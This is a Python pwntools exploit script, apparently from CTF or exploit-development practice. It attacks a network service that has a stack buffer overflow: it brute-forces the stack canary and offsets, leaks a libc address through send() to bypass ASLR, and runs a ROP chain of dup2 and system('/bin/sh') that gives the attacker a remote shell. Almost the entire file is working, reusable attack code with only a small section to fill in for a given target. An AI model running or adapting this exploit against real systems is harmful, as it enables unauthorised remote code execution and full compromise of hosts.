# -*- coding: utf-8 -*-

#
# Name: generic_ret2libc
#
# Author: Autonomoid
# Modification date: 2017-02-16
# Licence: GPL 2.0
#
# Assumptions:
# * A local copy of the binary is available.
# * Binary has a stack buffer overflow vulnerability.
# * Binary uses a stack canary.
# * Binary uses ASLR.
# * Binary is dynamically linked against libc.so.
# * Binary includes a call to libc.send() - which is likely given that its a network service.
# * Binary is listening on either the local machine or a remote machine.
#
# Outline:
# * Brute force the stack canary offset.
# * Brute force the stack canary value.
# * Brute force the return address offset from the canary.
# * Use an info leak to read addresses from the GOT.
# * Compute the base address of libc (and bypass ASLR).
# * Create ROP chain that:
#   i) links stdin and stdout to the netwrk socket.
#   ii) calls libc.system('/bin/sh').
#

from pwn import *
from ropper import RopperService

###############################################################################
############################ NON-GENERIC CODE #################################
###############################################################################

# Target-specific details.

target_ip_address = "0.0.0.0"
target_port       = 8181
binary_file       = 'target_binary'
libc_file         = '/lib/i386-linux-gnu/libc.so.6'

###############################################################################

# Binary-specific details

### This function must prepare the binary to accept the buffer overflow.
def setup_function(conn):
    conn.recvuntil('Select menu > ')
    conn.sendline('1')
    conn.recvuntil('Message : ')

### This function must exit the binary.
def exit_function(conn):
    conn.recvuntil('Select menu > ')
    conn.sendline('3')

###############################################################################
############################# GENERIC CODE ####################################
###############################################################################

def send_function(payload):
    conn           = remote(target_ip_address, target_port)
    setup_function(conn)
    conn.send(payload)
    exit_function(conn)
    data           = conn.recvall()
    conn.close()
    return data.count('G') > 0

###############################################################################

def guess_offset(initial_payload=''):
    offset  = 0
    is_safe = True
    while is_safe:
        print "[+] Offset: " + "#" * offset + " (" + str(offset) + ")"
        offset  += 1
	payload  = initial_payload + 'A' * offset

        is_safe = send_function(payload)
    return (offset - 1)

###############################################################################

def guess_canary(canary_offset):
    canary_length = 4
    canary        = ''
    canary_byte   = 0
    while len(canary) < canary_length:
	payload  = 'A' * canary_offset
	payload += canary
	payload += chr(canary_byte)

        canary_byte_is_correct = send_function(payload)

	if canary_byte_is_correct:
	    canary     += chr(canary_byte)
	    canary_byte = 0
	else:
	    canary_byte += 1

	canary_printable = [c for c in canary]
	print canary_printable
    return canary

###############################################################################

# Find the value and offset of the stack canary, and save it to file for
# reuseability.

canary_offset = 0
canary        = ''

if os.path.isfile('/tmp/canary'):
    temp = open('/tmp/canary', 'r')
    canary_offset = int(temp.readline())
    canary        = temp.read()
    print "[+] canary offset = " + str(canary_offset)
    print "[+] canary        = " + str(canary)
else:
    canary_offset = guess_offset()
    canary        = guess_canary(canary_offset)
    temp          = open('/tmp/canary', 'w')
    temp.write(str(canary_offset) + '\n')
    temp.write(canary)
    temp.close()

###############################################################################

# Find the return address offset from the stack canary, and save it to file for
# reuseability.

return_address_offset = 0

if os.path.isfile('/tmp/return_address_offset'):
    temp                  = open('/tmp/return_address_offset', 'r')
    return_address_offset = int(temp.readline())
    print "[+] return address offset = " + str(return_address_offset)
else:
    initial_payload       = "A" * canary_offset + canary
    return_address_offset = guess_offset(initial_payload)
    temp                  = open('/tmp/return_address_offset', 'w')
    temp.write(str(return_address_offset) + '\n')
    temp.close()

###############################################################################

def make_infoleak_payload(
	canary,
	canary_offset,
	return_address_offset,
	send_address,
	socket_file_descriptor,
        address_to_leak):
    payload = 'A' * canary_offset
    payload += canary
    payload += 'B' * return_address_offset
    payload += p32(send_address)
    payload += 'XXXX'
    payload += p32(socket_file_descriptor)
    payload += p32(address_to_leak)
    payload += p32(4)
    payload += p32(0)
    return payload

###############################################################################

def infoleak(conn, infoleak_payload):
    setup_function(conn)
    conn.send(infoleak_payload)
    exit_function(conn)
    leaked_data = conn.recv(4)
    leaked_data = leaked_data.ljust(4, '\x00')
    conn.close()
    return u32(leaked_data)

###############################################################################

# Leak the address of '__libc_start_main()'.

binary                 = ELF(binary_file)
send_address           = binary.symbols['send']
address_to_leak        = binary.symbols['got.__libc_start_main']
socket_file_descriptor = 0x4

infoleak_payload       = make_infoleak_payload(
				canary,
				canary_offset,
				return_address_offset,
				send_address,
				socket_file_descriptor,
				address_to_leak)

conn                   = remote(target_ip_address, target_port)
leaked_data            = infoleak(conn, infoleak_payload)

###############################################################################

# Compute the base address of 'libc'.

libc                          = ELF(libc_file)
libc_offset_of_leaked_address = libc.symbols['__libc_start_main']
libc_base_address             = leaked_data - libc_offset_of_leaked_address

###############################################################################

# Find the address of a 'pop, pop, ret' ROP gadget.

rs                  = RopperService()
rs.addFile(binary_file)
rs.options.type     = 'rop'
rs.loadGadgetsFor()
gadgets             = rs.searchPopPopRet()
pop_pop_ret_address = gadgets.items()[0][1][0].address

###############################################################################

def make_exploit_payload(
	canary,
	canary_offset,
	return_address_offset,
	libc_base_address,
	libc,
	binary,
        pop_pop_ret_address):
    stdin_file_descriptor  = 0
    stdout_file_descriptor = 1

    dup2_address           = libc_base_address + libc.symbols['dup2']
    system_address         = libc_base_address + libc.symbols['system']
    shell_string_address   = libc_base_address + list(libc.search("/bin/sh"))[0]

    # Overwrite canary
    ROP_chain  = 'A' * canary_offset
    ROP_chain += canary

    # Offset to saved EIP / return address.
    ROP_chain += 'B' * return_address_offset

    # Call dup2(socket_fd, stdin_fd) then skip over both arguments.
    ROP_chain += p32(dup2_address)
    ROP_chain += p32(pop_pop_ret_address)
    ROP_chain += p32(socket_file_descriptor)
    ROP_chain += p32(stdin_file_descriptor)

    # Call dup2(socket_fd, stdout_fd) then skip over both arguments.
    ROP_chain += p32(dup2_address)
    ROP_chain += p32(pop_pop_ret_address)
    ROP_chain += p32(socket_file_descriptor)
    ROP_chain += p32(stdout_file_descriptor)

    # Call system('/bin/sh')..
    ROP_chain += p32(system_address)
    ROP_chain += 'XXXX'
    ROP_chain += p32(shell_string_address)

    return ROP_chain

###############################################################################

def exploit(conn, exploit_payload):
    setup_function(conn)
    conn.send(exploit_payload)
    exit_function(conn)
    conn.interactive()

###############################################################################

# Exploit the binary.

conn            = remote(target_ip_address, target_port)
exploit_payload = make_exploit_payload(
			canary,
			canary_offset,
			return_address_offset,
			libc_base_address,
			libc,
			binary,
			pop_pop_ret_address)

exploit(conn, exploit_payload)

###############################################################################
